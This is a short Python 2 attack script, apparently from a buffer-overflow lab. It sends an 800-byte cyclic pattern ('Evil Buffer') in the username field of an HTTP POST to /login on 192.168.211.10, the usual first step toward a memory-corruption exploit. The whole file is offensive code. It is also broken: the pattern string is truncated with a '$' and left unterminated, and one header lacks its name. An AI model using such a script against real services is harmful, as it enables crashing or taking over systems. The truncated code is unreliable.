#!/usr/bin/python
import socket

try:
        print "\nSending Evil Buffer..."
        size = 800
        inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad$

        content = "username=" + inputBuffer + "&password=A"

        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.211.10\r\n"
        buffer += "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://192.168.211.10/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        buffer += content

        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.211.10", 80))
        s.send(buffer)

        s.close()

        print "\nDone"

except:
        print "\nCould not connect."
